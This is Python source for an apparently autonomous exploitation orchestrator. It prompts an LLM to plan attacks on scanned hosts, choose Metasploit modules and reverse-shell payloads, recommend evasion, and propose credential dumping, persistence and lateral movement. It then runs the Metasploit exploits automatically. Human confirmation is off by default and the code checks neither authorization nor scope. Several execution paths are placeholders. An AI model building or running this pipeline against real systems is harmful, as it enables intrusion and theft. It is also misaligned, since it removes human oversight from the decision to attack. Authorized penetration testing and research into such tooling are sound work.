"""
Phase 3 Orchestrator - LLM-Driven Intelligent Exploitation
Consumes Phase 1 & 2 results to autonomously exploit discovered vulnerabilities
"""
import asyncio
import time
from typing import Dict, Any, List, Optional, Set, Tuple
from loguru import logger
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from collections import defaultdict
import json
from pathlib import Path
import sys

# Import LLM orchestrator
from .llm_orchestrator import LLMOrchestrator

# Import exploitation tools
sys.path.insert(0, str(Path(__file__).parent.parent))
from exploit_dev.exploit_generator import ExploitGenerator
from modules.metasploit_framework import MetasploitFramework, MSFVenom


@dataclass
class ExploitAttempt:
    """Represents a single exploit attempt"""
    attempt_id: str
    target: str
    vulnerability_id: str
    exploit_type: str  # metasploit, custom, manual, etc.
    exploit_name: str
    technique: str  # buffer_overflow, sqli, rce, etc.
    payload: Optional[str] = None
    status: str = "pending"  # pending, running, success, failed, skipped
    success: bool = False
    evidence: List[str] = field(default_factory=list)
    error: Optional[str] = None
    shell_obtained: bool = False
    session_id: Optional[str] = None
    privileges: str = "none"  # none, user, root, system
    duration: float = 0.0
    start_time: Optional[datetime] = None
    end_time: Optional[datetime] = None
    llm_reasoning: str = ""
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'attempt_id': self.attempt_id,
            'target': self.target,
            'vulnerability_id': self.vulnerability_id,
            'exploit_type': self.exploit_type,
            'exploit_name': self.exploit_name,
            'technique': self.technique,
            'payload': self.payload,
            'status': self.status,
            'success': self.success,
            'evidence': self.evidence,
            'error': self.error,
            'shell_obtained': self.shell_obtained,
            'session_id': self.session_id,
            'privileges': self.privileges,
            'duration': self.duration,
            'llm_reasoning': self.llm_reasoning,
            'timestamp': self.end_time.isoformat() if self.end_time else None
        }


@dataclass
class Phase3Progress:
    """Track Phase 3 exploitation progress"""
    total_targets: int = 0
    total_vulnerabilities: int = 0
    total_attempts: int = 0
    successful_exploits: int = 0
    failed_attempts: int = 0
    shells_obtained: int = 0
    root_shells: int = 0
    user_shells: int = 0
    start_time: datetime = field(default_factory=datetime.now)
    
    @property
    def success_rate(self) -> float:
        if self.total_attempts == 0:
            return 0.0
        return (self.successful_exploits / self.total_attempts) * 100
    
    @property
    def exploitation_time(self) -> float:
        return (datetime.now() - self.start_time).total_seconds()


class Phase3Orchestrator:
    """
    Phase 3: LLM-Driven Intelligent Exploitation
    
    Takes Phase 1 (reconnaissance) and Phase 2 (vulnerability scanning) results
    and uses LLM to intelligently select and execute exploits
    """
    
    def __init__(self, llm_orchestrator: LLMOrchestrator, config: Optional[Dict[str, Any]] = None):
        self.llm = llm_orchestrator
        self.config = config or {}
        
        # Exploitation configuration
        self.max_attempts_per_vuln = self.config.get('max_attempts_per_vuln', 3)
        self.exploit_timeout = self.config.get('exploit_timeout', 300)  # 5 minutes
        self.require_confirmation = self.config.get('require_confirmation', False)
        self.aggressive_mode = self.config.get('aggressive_mode', False)
        self.safe_mode = self.config.get('safe_mode', True)
        
        # Data storage
        self.phase1_results: Dict[str, Any] = {}
        self.phase2_results: Dict[str, Any] = {}
        self.exploit_attempts: List[ExploitAttempt] = []
        self.successful_exploits: List[ExploitAttempt] = []
        self.compromised_hosts: Set[str] = set()
        self.progress = Phase3Progress()
        
        # Tool initialization
        self.exploit_generator = ExploitGenerator(config or {})
        self.metasploit = MetasploitFramework()
        self.msfvenom = MSFVenom()
        
        # LLM context and memory
        self.exploitation_history: List[Dict[str, Any]] = []
        
        logger.info("Phase 3 Orchestrator initialized")
    
    def load_phase1_results(self, results: Dict[str, Any]):
        """Load Phase 1 reconnaissance results"""
        self.phase1_results = results
        logger.info(f"Loaded Phase 1 results: {len(results.get('hosts', []))} hosts discovered")
    
    def load_phase2_results(self, results: Dict[str, Any]):
        """Load Phase 2 vulnerability assessment results"""
        self.phase2_results = results
        
        vulns = results.get('vulnerabilities', [])
        self.progress.total_vulnerabilities = len(vulns)
        
        # Count unique targets
        targets = set(v.get('affected_target') for v in vulns if v.get('affected_target'))
        self.progress.total_targets = len(targets)
        
        logger.info(f"Loaded Phase 2 results: {len(vulns)} vulnerabilities across {len(targets)} targets")
    
    async def create_exploitation_plan(self) -> Dict[str, Any]:
        """
        Use LLM to create intelligent exploitation plan
        Analyzes Phase 1 & 2 data and suggests exploitation strategy
        """
        logger.info("Creating LLM-driven exploitation plan...")
        
        # Prepare context for LLM
        context = self._prepare_llm_context()
        
        # Build LLM prompt
        prompt = f"""You are an expert penetration tester analyzing reconnaissance and vulnerability scan results to create an exploitation plan.

# PHASE 1 RECONNAISSANCE DATA:
{json.dumps(self._summarize_phase1(), indent=2)}

# PHASE 2 VULNERABILITY DATA:
{json.dumps(self._summarize_phase2(), indent=2)}

# TASK:
Create a prioritized exploitation plan that:
1. Prioritizes critical/high severity vulnerabilities
2. Considers exploit availability and reliability
3. Suggests specific tools/techniques for each vulnerability
4. Recommends attack order (which targets first, why)
5. Identifies dependencies (e.g., need credentials before lateral movement)
6. Suggests payloads based on target OS and architecture
7. Provides alternative approaches if primary exploit fails

# OUTPUT FORMAT (JSON):
{{
  "exploitation_strategy": "brief overall strategy description",
  "priority_targets": [
    {{
      "target": "IP/hostname",
      "reason": "why this target first",
      "vulnerabilities": ["CVE-2024-1234", ...],
      "estimated_success_rate": 0.85
    }}
  ],
  "exploit_sequence": [
    {{
      "target": "IP/hostname",
      "vulnerability_id": "CVE-2024-1234",
      "severity": "critical",
      "cvss_score": 9.8,
      "affected_service": "Apache 2.4.49",
      "primary_approach": {{
        "tool": "metasploit|custom|manual",
        "exploit_module": "exploit/unix/http/apache_mod_cgi_bash_env_exec",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "technique": "RCE via environment variable injection",
        "success_probability": 0.9,
        "reasoning": "why this approach"
      }},
      "fallback_approaches": [
        {{
          "tool": "...",
          "technique": "...",
          "reasoning": "..."
        }}
      ],
      "prerequisites": ["none" or list of requirements],
      "post_exploit_actions": ["dump credentials", "establish persistence", ...]
    }}
  ],
  "risk_assessment": {{
    "noise_level": "low|medium|high",
    "detection_probability": 0.3,
    "recommended_evasion": ["technique1", "technique2"]
  }}
}}

Provide ONLY valid JSON, no additional text."""

        system_prompt = """You are a highly skilled penetration testing AI with deep knowledge of:
- Common vulnerabilities and exploits (CVE database)
- Metasploit framework and modules
- Custom exploit development
- Post-exploitation techniques
- Operational security and evasion
- Network and system architecture

Your goal is to create the most effective exploitation plan while being mindful of detection risks."""

        # Get LLM response
        try:
            response = self.llm.generate(prompt, system_prompt=system_prompt)
            
            # Parse JSON response
            # Remove markdown code blocks if present
            response = response.strip()
            if response.startswith('```'):
                # Extract JSON from code block
                lines = response.split('\n')
                response = '\n'.join(lines[1:-1]) if len(lines) > 2 else response
                if response.startswith('json'):
                    response = '\n'.join(response.split('\n')[1:])
            
            exploitation_plan = json.loads(response)
            
            logger.success("LLM-driven exploitation plan created successfully")
            return exploitation_plan
            
        except json.JSONDecodeError as e:
            logger.error(f"Failed to parse LLM response as JSON: {e}")
            logger.debug(f"LLM Response: {response}")
            
            # Fallback to basic plan
            return self._create_basic_exploitation_plan()
        except Exception as e:
            logger.error(f"Error creating exploitation plan: {e}")
            return self._create_basic_exploitation_plan()
    
    async def execute_exploitation_plan(self, plan: Dict[str, Any]) -> Dict[str, Any]:
        """Execute the LLM-generated exploitation plan"""
        logger.info("Starting Phase 3 exploitation...")
        
        exploit_sequence = plan.get('exploit_sequence', [])
        self.progress.total_attempts = len(exploit_sequence)
        
        results = {
            'plan': plan,
            'attempts': [],
            'successful_exploits': [],
            'compromised_hosts': [],
            'statistics': {}
        }
        
        for idx, exploit_spec in enumerate(exploit_sequence, 1):
            logger.info(f"[{idx}/{len(exploit_sequence)}] Attempting exploitation: {exploit_spec.get('vulnerability_id')}")
            
            # Execute primary approach
            attempt = await self._execute_exploit_attempt(
                exploit_spec,
                approach=exploit_spec.get('primary_approach')
            )
            
            self.exploit_attempts.append(attempt)
            results['attempts'].append(attempt.to_dict())
            
            # If failed and fallback exists, try fallback
            if not attempt.success and exploit_spec.get('fallback_approaches'):
                logger.info("Primary exploit failed, trying fallback approaches...")
                
                for fallback_idx, fallback in enumerate(exploit_spec.get('fallback_approaches', []), 1):
                    logger.info(f"Fallback approach {fallback_idx}/{len(exploit_spec['fallback_approaches'])}")
                    
                    fallback_attempt = await self._execute_exploit_attempt(
                        exploit_spec,
                        approach=fallback,
                        is_fallback=True
                    )
                    
                    self.exploit_attempts.append(fallback_attempt)
                    results['attempts'].append(fallback_attempt.to_dict())
                    
                    if fallback_attempt.success:
                        attempt = fallback_attempt  # Use successful fallback
                        break
            
            # Track success
            if attempt.success:
                self.progress.successful_exploits += 1
                self.successful_exploits.append(attempt)
                self.compromised_hosts.add(attempt.target)
                results['successful_exploits'].append(attempt.to_dict())
                
                if attempt.shell_obtained:
                    self.progress.shells_obtained += 1
                    if attempt.privileges in ['root', 'system']:
                        self.progress.root_shells += 1
                    else:
                        self.progress.user_shells += 1
                
                logger.success(f"✓ Successfully exploited {attempt.target} via {attempt.exploit_name}")
                
                # Execute post-exploitation actions if specified
                if exploit_spec.get('post_exploit_actions'):
                    await self._execute_post_exploit_actions(
                        attempt,
                        exploit_spec['post_exploit_actions']
                    )
            else:
                self.progress.failed_attempts += 1
                logger.warning(f"✗ Failed to exploit {attempt.target}: {attempt.error}")
            
            # Add to exploitation history for LLM learning
            self.exploitation_history.append({
                'attempt': attempt.to_dict(),
                'spec': exploit_spec,
                'success': attempt.success
            })
        
        # Compile statistics
        results['compromised_hosts'] = list(self.compromised_hosts)
        results['statistics'] = self._compile_statistics()
        
        logger.info(f"Phase 3 complete: {self.progress.successful_exploits}/{self.progress.total_attempts} successful")
        
        return results
    
    async def _execute_exploit_attempt(
        self,
        exploit_spec: Dict[str, Any],
        approach: Dict[str, Any],
        is_fallback: bool = False
    ) -> ExploitAttempt:
        """Execute a single exploit attempt"""
        
        attempt_id = f"attempt_{len(self.exploit_attempts) + 1}"
        target = exploit_spec.get('target')
        vuln_id = exploit_spec.get('vulnerability_id')
        
        attempt = ExploitAttempt(
            attempt_id=attempt_id,
            target=target,
            vulnerability_id=vuln_id,
            exploit_type=approach.get('tool', 'unknown'),
            exploit_name=approach.get('exploit_module', 'unknown'),
            technique=approach.get('technique', 'unknown'),
            payload=approach.get('payload'),
            llm_reasoning=approach.get('reasoning', '')
        )
        
        attempt.start_time = datetime.now()
        attempt.status = "running"
        
        try:
            tool = approach.get('tool', '').lower()
            
            if tool == 'metasploit':
                result = await self._execute_metasploit_exploit(exploit_spec, approach, attempt)
            elif tool == 'custom':
                result = await self._execute_custom_exploit(exploit_spec, approach, attempt)
            elif tool == 'manual':
                result = await self._execute_manual_exploit(exploit_spec, approach, attempt)
            else:
                # Let LLM suggest the technique
                result = await self._execute_llm_suggested_exploit(exploit_spec, approach, attempt)
            
            attempt.success = result.get('success', False)
            attempt.evidence = result.get('evidence', [])
            attempt.shell_obtained = result.get('shell_obtained', False)
            attempt.session_id = result.get('session_id')
            attempt.privileges = result.get('privileges', 'none')
            
            attempt.status = "success" if attempt.success else "failed"
            attempt.error = result.get('error')
            
        except asyncio.TimeoutError:
            attempt.status = "failed"
            attempt.error = f"Exploit timeout after {self.exploit_timeout}s"
            logger.warning(f"Exploit attempt timed out: {attempt.exploit_name}")
        except Exception as e:
            attempt.status = "failed"
            attempt.error = str(e)
            logger.error(f"Exploit attempt error: {e}")
        finally:
            attempt.end_time = datetime.now()
            attempt.duration = (attempt.end_time - attempt.start_time).total_seconds()
        
        return attempt
    
    async def _execute_metasploit_exploit(
        self,
        exploit_spec: Dict[str, Any],
        approach: Dict[str, Any],
        attempt: ExploitAttempt
    ) -> Dict[str, Any]:
        """Execute Metasploit-based exploit"""
        logger.info(f"Executing Metasploit module: {approach.get('exploit_module')}")
        
        target = exploit_spec.get('target')
        exploit_module = approach.get('exploit_module')
        payload = approach.get('payload', 'generic/shell_reverse_tcp')
        
        # Prepare options
        options = {
            'RHOSTS': target,
            'PAYLOAD': payload
        }
        
        # Add any additional options from LLM
        if approach.get('options'):
            options.update(approach['options'])
        
        # Check if Metasploit is available
        if not self.metasploit.check_installed():
            logger.warning("Metasploit not installed, attempting installation...")
            # In production, handle installation
            return {
                'success': False,
                'error': 'Metasploit Framework not installed'
            }
        
        # Execute exploit
        try:
            result = self.metasploit.run_exploit(
                exploit_module,
                target,
                payload=payload,
                options=options
            )
            
            parsed = self.metasploit.parse_output(result.get('stdout', ''))
            
            return {
                'success': parsed.get('exploited', False),
                'shell_obtained': len(parsed.get('sessions', [])) > 0,
                'session_id': parsed['sessions'][0] if parsed.get('sessions') else None,
                'evidence': [result.get('stdout', '')],
                'privileges': 'user',  # Would need to check actual privileges
                'error': result.get('stderr') if result.get('return_code') != 0 else None
            }
        except Exception as e:
            return {
                'success': False,
                'error': f"Metasploit execution failed: {str(e)}"
            }
    
    async def _execute_custom_exploit(
        self,
        exploit_spec: Dict[str, Any],
        approach: Dict[str, Any],
        attempt: ExploitAttempt
    ) -> Dict[str, Any]:
        """Execute custom-generated exploit"""
        logger.info("Executing custom exploit")
        
        # Use exploit generator
        vuln_info = {
            'type': exploit_spec.get('technique', 'unknown'),
            'target': exploit_spec.get('target'),
            'service': exploit_spec.get('affected_service'),
            'version': exploit_spec.get('affected_version', '')
        }
        
        try:
            exploit = await self.exploit_generator.generate_exploit(vuln_info)
            
            if not exploit:
                return {
                    'success': False,
                    'error': 'Failed to generate exploit'
                }
            
            # Execute generated exploit (would need actual execution logic)
            # This is a placeholder - actual implementation would run the exploit
            logger.info(f"Generated exploit: {exploit.get('type')}")
            
            return {
                'success': False,  # Placeholder
                'error': 'Custom exploit execution not fully implemented (requires runtime execution)',
                'evidence': [json.dumps(exploit, indent=2)]
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f"Custom exploit generation failed: {str(e)}"
            }
    
    async def _execute_manual_exploit(
        self,
        exploit_spec: Dict[str, Any],
        approach: Dict[str, Any],
        attempt: ExploitAttempt
    ) -> Dict[str, Any]:
        """Execute manual exploitation technique"""
        logger.info("Executing manual exploitation technique")
        
        technique = approach.get('technique', '').lower()
        
        # This would contain manual exploitation logic
        # For now, return placeholder
        return {
            'success': False,
            'error': f'Manual technique "{technique}" requires interactive execution',
            'evidence': [approach.get('reasoning', '')]
        }
    
    async def _execute_llm_suggested_exploit(
        self,
        exploit_spec: Dict[str, Any],
        approach: Dict[str, Any],
        attempt: ExploitAttempt
    ) -> Dict[str, Any]:
        """Let LLM suggest and guide the exploitation in real-time"""
        logger.info("Using LLM for dynamic exploitation guidance")
        
        # Build context
        context = f"""
Target: {exploit_spec.get('target')}
Vulnerability: {exploit_spec.get('vulnerability_id')}
Service: {exploit_spec.get('affected_service')}
Technique: {approach.get('technique')}

Available tools:
- Metasploit Framework
- Custom exploit generator
- Python scripting
- Network tools

Task: Provide step-by-step exploitation commands/script for this vulnerability.
"""
        
        try:
            response = self.llm.generate(
                context,
                system_prompt="You are a penetration testing expert. Provide specific, actionable exploit commands."
            )
            
            # Parse LLM response and attempt to execute
            # This would require parsing commands and executing them
            # For now, return the guidance
            
            return {
                'success': False,
                'error': 'LLM-guided exploitation requires interactive execution',
                'evidence': [response],
                'llm_guidance': response
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f"LLM exploitation guidance failed: {str(e)}"
            }
    
    async def _execute_post_exploit_actions(
        self,
        successful_attempt: ExploitAttempt,
        actions: List[str]
    ):
        """Execute post-exploitation actions after successful exploit"""
        logger.info(f"Executing {len(actions)} post-exploitation actions")
        
        for action in actions:
            logger.info(f"Post-exploit action: {action}")
            
            # This would execute actual post-exploit actions
            # Examples: dump credentials, establish persistence, lateral movement
            # For now, just log
            
            if 'credential' in action.lower():
                logger.info("Would dump credentials here")
            elif 'persistence' in action.lower():
                logger.info("Would establish persistence here")
            elif 'lateral' in action.lower():
                logger.info("Would attempt lateral movement here")
    
    def _prepare_llm_context(self) -> Dict[str, Any]:
        """Prepare comprehensive context for LLM"""
        return {
            'phase1_summary': self._summarize_phase1(),
            'phase2_summary': self._summarize_phase2(),
            'exploitation_history': self.exploitation_history[-10:]  # Last 10 attempts
        }
    
    def _summarize_phase1(self) -> Dict[str, Any]:
        """Summarize Phase 1 reconnaissance data"""
        if not self.phase1_results:
            return {}
        
        return {
            'total_hosts': len(self.phase1_results.get('hosts', [])),
            'hosts': self.phase1_results.get('hosts', [])[:5],  # Top 5 for brevity
            'services_found': self.phase1_results.get('services_summary', {}),
            'osint_findings': len(self.phase1_results.get('osint_data', {}))
        }
    
    def _summarize_phase2(self) -> Dict[str, Any]:
        """Summarize Phase 2 vulnerability data"""
        if not self.phase2_results:
            return {}
        
        vulns = self.phase2_results.get('vulnerabilities', [])
        
        # Group by severity
        by_severity = defaultdict(list)
        for v in vulns:
            severity = v.get('severity', 'unknown')
            by_severity[severity].append(v)
        
        return {
            'total_vulnerabilities': len(vulns),
            'by_severity': {
                'critical': len(by_severity.get('critical', [])),
                'high': len(by_severity.get('high', [])),
                'medium': len(by_severity.get('medium', [])),
                'low': len(by_severity.get('low', []))
            },
            'exploitable_vulns': [
                {
                    'id': v.get('vuln_id'),
                    'target': v.get('affected_target'),
                    'service': v.get('affected_service'),
                    'severity': v.get('severity'),
                    'cvss': v.get('cvss_score'),
                    'exploit_available': v.get('exploit_available'),
                    'exploit_refs': v.get('exploit_references', [])
                }
                for v in vulns
                if v.get('severity') in ['critical', 'high']
            ]
        }
    
    def _create_basic_exploitation_plan(self) -> Dict[str, Any]:
        """Fallback basic exploitation plan if LLM fails"""
        logger.warning("Creating basic exploitation plan (LLM failed)")
        
        vulns = self.phase2_results.get('vulnerabilities', [])
        
        # Sort by severity
        sorted_vulns = sorted(
            vulns,
            key=lambda v: (
                {'critical': 4, 'high': 3, 'medium': 2, 'low': 1}.get(v.get('severity'), 0),
                v.get('cvss_score', 0.0)
            ),
            reverse=True
        )
        
        exploit_sequence = []
        for vuln in sorted_vulns[:10]:  # Top 10
            exploit_sequence.append({
                'target': vuln.get('affected_target'),
                'vulnerability_id': vuln.get('vuln_id'),
                'severity': vuln.get('severity'),
                'cvss_score': vuln.get('cvss_score'),
                'affected_service': vuln.get('affected_service'),
                'primary_approach': {
                    'tool': 'metasploit',
                    'technique': 'automated',
                    'reasoning': 'Basic automated approach'
                },
                'fallback_approaches': [],
                'prerequisites': [],
                'post_exploit_actions': []
            })
        
        return {
            'exploitation_strategy': 'Basic priority-based exploitation',
            'priority_targets': [],
            'exploit_sequence': exploit_sequence,
            'risk_assessment': {
                'noise_level': 'medium',
                'detection_probability': 0.5,
                'recommended_evasion': []
            }
        }
    
    def _compile_statistics(self) -> Dict[str, Any]:
        """Compile exploitation statistics"""
        return {
            'total_attempts': self.progress.total_attempts,
            'successful_exploits': self.progress.successful_exploits,
            'failed_attempts': self.progress.failed_attempts,
            'success_rate': self.progress.success_rate,
            'shells_obtained': self.progress.shells_obtained,
            'root_shells': self.progress.root_shells,
            'user_shells': self.progress.user_shells,
            'compromised_hosts': len(self.compromised_hosts),
            'exploitation_time': self.progress.exploitation_time,
            'average_time_per_attempt': (
                self.progress.exploitation_time / self.progress.total_attempts
                if self.progress.total_attempts > 0 else 0
            )
        }
    
    def save_results(self, output_dir: str = "./reports/phase3") -> str:
        """Save exploitation results to file"""
        output_path = Path(output_dir)
        output_path.mkdir(parents=True, exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = output_path / f"phase3_exploitation_{timestamp}.json"
        
        results = {
            'exploitation_summary': {
                'total_targets': self.progress.total_targets,
                'total_vulnerabilities': self.progress.total_vulnerabilities,
                'total_attempts': self.progress.total_attempts,
                'successful_exploits': self.progress.successful_exploits,
                'failed_attempts': self.progress.failed_attempts,
                'success_rate': self.progress.success_rate,
                'shells_obtained': self.progress.shells_obtained,
                'compromised_hosts': list(self.compromised_hosts),
                'exploitation_duration': self.progress.exploitation_time
            },
            'attempts': [attempt.to_dict() for attempt in self.exploit_attempts],
            'successful_exploits': [attempt.to_dict() for attempt in self.successful_exploits],
            'statistics': self._compile_statistics()
        }
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        
        logger.success(f"Phase 3 results saved to {filename}")
        return str(filename)


# Convenience function for quick execution
async def run_phase3_exploitation(
    phase1_results: Dict[str, Any],
    phase2_results: Dict[str, Any],
    llm_orchestrator: LLMOrchestrator,
    config: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Convenience function to run Phase 3 exploitation
    
    Args:
        phase1_results: Results from Phase 1 reconnaissance
        phase2_results: Results from Phase 2 vulnerability scanning
        llm_orchestrator: LLM orchestrator instance
        config: Optional configuration dictionary
        
    Returns:
        Dictionary containing all exploitation results
    """
    orchestrator = Phase3Orchestrator(llm_orchestrator, config)
    orchestrator.load_phase1_results(phase1_results)
    orchestrator.load_phase2_results(phase2_results)
    
    # Create exploitation plan
    plan = await orchestrator.create_exploitation_plan()
    
    # Execute exploitation
    results = await orchestrator.execute_exploitation_plan(plan)
    
    # Save results
    orchestrator.save_results()
    
    return results
